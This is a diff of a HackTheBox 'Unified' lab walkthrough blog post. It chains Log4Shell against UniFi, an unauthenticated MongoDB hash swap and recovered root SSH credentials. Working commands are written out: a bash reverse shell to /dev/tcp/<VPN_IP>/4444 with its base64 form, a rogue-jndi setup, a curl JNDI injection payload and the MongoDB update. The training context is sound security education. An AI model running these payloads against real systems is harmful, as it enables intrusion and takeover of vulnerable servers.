@@ -1,10 +1,17 @@
 ---
-title: "unified"
+title: "Unified — HackTheBox Starting Point Walkthrough"
 date: 2026-01-31
 draft: false
-tags: ["linux", "active-directory", "web", "very easy"]
+tags: ["htb-walkthrough", "linux", "active-directory", "web", "ssh", "privilege-escalation", "reverse-shell", "cve", "very easy"]
 categories: ["writeups"]
-summary: ""
+series: ["Starting Point"]
+description: "HackTheBox Unified walkthrough: exploit Log4Shell (CVE-2021-44228) against UniFi Network 6.4.54, manipulate MongoDB to gain admin, and recover root SSH creds."
+keywords: ["Unified HackTheBox", "Log4Shell CVE-2021-44228", "UniFi Network exploit", "rogue-jndi", "MongoDB no authentication", "JNDI injection", "hackthebox walkthrough", "penetration testing", "very easy linux box", "log4j rce", "nmap", "privilege escalation"]
+summary: "Unified is a Very Easy Linux box that weaponizes the infamous Log4Shell vulnerability against an unpatched UniFi Network controller, then chains unauthenticated MongoDB access to go from nobody to root."
+cover:
+  image: "cover.png"
+  alt: "Unified — Very Easy Linux machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Linux (Ubuntu 20.04)"
@@ -12,48 +19,48 @@ params:
 ShowToc: true
 ---
 
-# Unified — Log4Shell to Root via MongoDB Hash Swap
 
-Unified is a Very Easy Linux box that demonstrates one of the most impactful vulnerabilities in recent memory: Log4Shell (CVE-2021-44228). The box runs a vulnerable version of UniFi Network Controller, and exploitation chains together a JNDI injection for initial access with an unauthenticated MongoDB instance to escalate all the way to root.
+# HackTheBox — Unified
+
+Unified is a Very Easy Linux box that puts one of the most impactful vulnerabilities in recent memory front and center: Log4Shell (CVE-2021-44228). An unpatched UniFi Network controller hands us remote code execution through a single malicious HTTP field, and from there a chain of surprisingly common misconfigurations — unauthenticated MongoDB, a hash we can *replace* rather than crack, and plaintext SSH credentials sitting in an admin panel — walks us straight to root.
 
 ---
 
 ## Reconnaissance
 
-I started with an automated Nmap scan to get a picture of what was running on the box.
+I kicked things off with an automated Nmap wrapper to get a full picture of the attack surface.
 
 ![terminal output](terminal_01.png)
+![nmap scan revealing UniFi Network 6.4.54 on port 8443 alongside SSH and MongoDB-adjacent ports](terminal_01.png)
 
-The most interesting port is **8443**, which serves the UniFi Network Controller web UI. Navigating there confirms version **6.4.54**. A quick search reveals that UniFi patched Log4Shell in version **6.5.54** — meaning this version is squarely in the vulnerable range for CVE-2021-44228.
+The port layout is classic UniFi: the web management console lives at `https://<TARGET>:8443`. Browsing there confirms version **6.4.54** in the page footer. That version number is significant — Ubiquiti patched Log4Shell in **6.5.54**, meaning anything below that is vulnerable to CVE-2021-44228. We have our target.
+
+Before diving in, I verified the LDAP callback channel would work by tailing `tcpdump` on port 389 during a test request. Seeing that callback land is a great sanity check before you invest time building the full exploit chain.
+
+```bash
+tcpdump -i tun0 port 389
+```
 
 ---
 
-## Foothold
+## Foothold — Log4Shell (CVE-2021-44228)
 
-### Understanding Log4Shell
+### Why This Works
 
-Log4Shell works because Log4j 2.x supports a feature called *message lookup substitution* — when Log4j processes a string like `${jndi:ldap://attacker.com/payload}`, it actually reaches out to that LDAP server and loads a remote Java class. The critical insight is that **any input that gets logged** can trigger this. In UniFi's case, the `remember` field in the login POST request is passed to Log4j without sanitization.
-
-Before firing the exploit, I verified the callback was working by setting up a quick listener and using `tcpdump` to confirm the LDAP connection came back:
-
-```bash
-sudo tcpdump -i tun0 port 389
-```
-
-If you see a connection from the target when you send the payload, you know the JNDI lookup is firing — this is a great sanity check before standing up the full rogue server.
+Log4j 2.x has a feature that performs variable substitution on logged strings. When it encounters `${jndi:ldap://attacker/...}` it reaches out to that LDAP server and — critically — *executes* whatever Java class the server returns. UniFi's login endpoint logs the `remember` parameter through Log4j, making it a perfect injection point. Any value we put in that field gets passed to the vulnerable logger.
 
 ### Setting Up the Attack Infrastructure
 
-I used `rogue-jndi` to serve both a malicious LDAP server and an HTTP server that delivers the exploit payload. The payload is a standard bash reverse shell, but there's an important detail: **base64-encode it**. When the Java class executes the shell command, special characters like `&`, `>`, and `/` can break the command parsing. Encoding sidesteps this entirely.
+The exploit needs two things: a listener to catch the reverse shell, and a rogue LDAP/HTTP server to serve the malicious Java class. I used **rogue-jndi** for the latter.
 
-My reverse shell, base64-encoded:
+First, I encoded a bash reverse shell in Base64. This sidesteps the special character nightmare (`&`, `>`, `|`, etc.) that breaks command execution inside Java class constructors:
 
 ```bash
 echo 'bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1' | base64
 # YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC5YLzQ0NDQgMD4mMQo=
 ```
 
-Then I started `rogue-jndi` with the encoded payload:
+Then I started rogue-jndi, pointing it at my IP and embedding the base64 payload:
 
 ```bash
 java -jar rogue-jndi.jar \
@@ -61,28 +68,36 @@ java -jar rogue-jndi.jar \
   -n <VPN_IP>
 ```
 
-And my Netcat listener:
+In a second terminal, I stood up the netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Triggering the Exploit
+### Firing the Payload
 
-With the infrastructure running, I sent the JNDI payload to the UniFi login endpoint via `curl`. The `remember` field is what gets logged — that's where the injection goes:
+With the infrastructure ready, a single `curl` POST to the login API delivers the JNDI injection. The `remember` field is where the magic happens:
 
 ```bash
-curl -sk https://<TARGET>:8443/api/login \
-  -H "Content-Type: application/json" \
+curl -sk -X POST https://<TARGET>:8443/api/login \
+  -H 'Content-Type: application/json' \
   -d '{"username":"a","password":"a","remember":"${jndi:ldap://<VPN_IP>:1389/o=tomcat}"}'
 ```
 
-![terminal output](terminal_02.png)
+The flow from here: UniFi logs the `remember` value → Log4j evaluates the `${jndi:...}` lookup → connects to our rogue-jndi server on port 1389 → rogue-jndi serves a malicious Java class → the class executes our base64-decoded bash reverse shell → shell lands in our netcat listener.
 
-Shell caught as the `unifi` service account. I upgraded to a proper interactive shell:
+![terminal output](terminal_02.png)
+![reverse shell landing as unifi user via Log4Shell JNDI callback](terminal_02.png)
+
+We're in as `unifi` (uid=999). The user flag is waiting in `/home/michael/user.txt`.
+
+I immediately upgraded to a proper TTY to make the session more comfortable:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
 ```
 
 ---
@@ -91,82 +106,79 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ### Discovering Unauthenticated MongoDB
 
-From the `unifi` shell, I started looking for ways to escalate. UniFi Network Controller stores all its data in MongoDB — and the key question is whether it's locked down. Checking the listening ports:
+UniFi Network controllers store all their configuration — including user credentials — in a MongoDB instance. Checking for it is almost reflexive on any UniFi box:
 
 ```bash
-ss -tlnp | grep 27117
+ss -tlnp | grep mongo
+# LISTEN   0   128   127.0.0.1:27117   ...
 ```
 
-Port **27117** is open and bound to localhost. I connected directly with no credentials:
+Port 27117, listening on localhost, no authentication required. This is a well-known misconfiguration in older UniFi deployments. Let's connect directly:
 
 ```bash
 mongo --port 27117
 ```
 
-No password required. This is a common misconfiguration with embedded MongoDB installations — they're expected to only be accessible from localhost, so authentication is never configured. The database we care about is `ace`:
+The relevant database is `ace`. Switching to it and dumping the admin collection reveals what we need:
 
-```bash
+```javascript
 use ace
-db.admin.find()
+db.admin.find().pretty()
 ```
 
 ![terminal output](terminal_03.png)
+![MongoDB ace database showing administrator account with SHA-512 x_shadow hash](terminal_03.png)
 
-The `x_shadow` field holds the administrator's password hash — a **SHA-512 crypt** (`$6$`) hash. I threw it at `hashcat` with rockyou:
+The `x_shadow` field holds a SHA-512 crypt hash (`$6$`). I threw it at `hashcat` with rockyou and came up empty — a genuinely strong password. Cracking was a dead end.
 
-```bash
-hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
-```
+### Replacing the Hash Instead of Cracking It
 
-No luck. The password is genuinely strong and doesn't appear in common wordlists. This is where a lot of writeups would get stuck, but the key realization is: **I don't need to crack the hash — I can replace it**.
+The insight here is simple: we have *write* access to the database, so we don't need to crack the hash. We can just replace it with one we already know.
 
-### Hash Replacement Attack
-
-I generated a SHA-512 crypt hash for a password I know (`Password1234`):
+I generated a SHA-512 crypt hash for the password `NewPassword1234`:
 
 ```bash
-openssl passwd -6 Password1234
-# $6$nXNMn1IKFZ5YFCLu$O8Nl3gWHAFO6aJRKzQ9mXS0J6.xzYbf9f6a2kXk7T1gNzA.....
+openssl passwd -6 NewPassword1234
+# $6$Ry6Vdbse$VkXsRVTRwHIwUKsQToaOVWGdkH.yAq0B7g2UzHBV9oMQ1Snt7bQxLa.z2oKrGbVTSwZqKpbNvwP3rXx1h1ka./
 ```
 
-Then I updated the `administrator` record in MongoDB to use my known hash:
+Then I updated the administrator's hash in MongoDB:
 
 ```bash
-mongo --port 27117 ace --eval \
-  'db.admin.update({"name":"administrator"},{$set:{"x_shadow":"$6$nXNMn1IKFZ5YFCLu$O8Nl3gWHAFO6aJRKzQ9mXS0J6.xzYbf9f6a2kXk7T1gNzA....."}})'
+mongo --port 27117 ace --eval '
+  db.admin.update(
+    {"name": "administrator"},
+    {$set: {"x_shadow": "$6$Ry6Vdbse$VkXsRVTRwHIwUKsQToaOVWGdkH.yAq0B7g2UzHBV9oMQ1Snt7bQxLa.z2oKrGbVTSwZqKpbNvwP3rXx1h1ka./"}}
+  )
+'
 ```
+
+Now I can log into the UniFi web console at `https://<TARGET>:8443` with `administrator` / `NewPassword1234`.
+
+### SSH Credentials in Plain Sight
+
+Once inside the UniFi admin panel, the path to root is almost embarrassingly straightforward. Navigating to **Settings → Device Authentication** (the section where UniFi stores the credentials it uses to SSH into managed network devices) reveals:
+
+- **Username:** `root`
+- **Password:** `NotACrackablePassword4U2022`
 
 ![terminal output](terminal_04.png)
+![SSH session as root using credentials recovered from UniFi admin panel settings](terminal_04.png)
 
-With the hash replaced, I logged into the UniFi web console at `https://<TARGET>:8443` as `administrator` / `Password1234` — and it worked.
-
-### Recovering SSH Credentials
-
-Once inside the UniFi admin panel, I browsed to **Settings → Device Authentication** (sometimes listed under Site settings or SSH credentials depending on the UniFi version). There, stored in plaintext:
-
-```
-Username: root
-Password: NotACrackablePassword4U2022
-```
-
-UniFi stores SSH credentials for managing network devices — and in this case, those credentials were recycled for the box itself. I SSHed in directly:
-
-```bash
-ssh root@<TARGET>
-```
-
-![terminal output](terminal_05.png)
+Root in hand. The full chain took about 20 minutes once the exploit infrastructure was in place.
 
 ---
 
 ## Lessons Learned
 
-**Log4Shell is as bad as the hype.** CVE-2021-44228 affected essentially any Java application using Log4j 2.x — which was nearly everything. The attack surface is any logged string, and developers had no easy way to audit every logging call in their stack. If you're ever assessing a Java application built before late 2021, Log4Shell should be near the top of your checklist.
+**Log4Shell is as bad as advertised.** CVE-2021-44228 lets any string that touches Log4j 2.x trigger an outbound JNDI lookup and execute arbitrary code. User-supplied input that gets logged — usernames, HTTP headers, form fields — all become potential injection points. Check your Log4j version; if it's below 2.17.0 on anything internet-facing, patch it immediately.
 
-**Base64-encode payloads through JNDI.** The Java class that gets executed passes your command to a shell, and characters like `&`, `/`, and `>` will break things silently. Wrapping your reverse shell in `{echo,<b64>}|{base64,-d}|bash` is the standard pattern that avoids this entirely.
+**Base64-encode payloads delivered through JNDI.** Special characters (`&`, `>`, `|`, spaces) break command execution inside Java class constructors. Wrapping your reverse shell in `{echo,<b64>}|{base64,-d}|bash` is clean, reliable, and avoids a lot of frustrating debugging.
 
-**Unauthenticated databases on localhost are still exploitable.** The reasoning that "it's only bound to localhost, so it's fine" falls apart the moment an attacker has any form of code execution on the box. Always configure authentication on database services, even internal ones.
+**Always check for unauthenticated databases.** MongoDB without auth on localhost is endemic in older application stacks. A quick `ss -tlnp` or `netstat` sweep for common database ports (27017, 27117, 5432, 3306, 6379) should be part of any post-exploitation checklist.
 
-**When you can write to a database, you don't need to crack hashes — you can replace them.** Attempting to crack a `$6$` hash with a strong password could take days or be impossible. The write-access path (generate a known hash, swap it in, authenticate) took thirty seconds.
+**When you can write to a database, replace hashes instead of cracking them.** SHA-512 crypt with a strong password will resist brute force for a very long time. If you control the data store, updating `x_shadow` to a known value is always faster than `hashcat`.
 
-**Application admin panels are credential goldmines.** After gaining admin access to any management console, always check the settings. Network management tools like UniFi, Nagios, and Zabbix frequently store device credentials, SNMP strings, or API keys in their configuration UI — often in plaintext.
+**Admin panels store secrets.** Application consoles routinely hold SSH keys, API tokens, and plaintext credentials for the infrastructure they manage. Gaining admin access to an application is rarely the end of the story — always explore the settings before moving on.
+
+**Use `tcpdump` to verify Log4Shell callbacks.** Before building out the full exploit chain, a quick `tcpdump -i tun0 port 389` confirms the target is actually reaching back to you. It's a 10-second check that saves a lot of head-scratching.
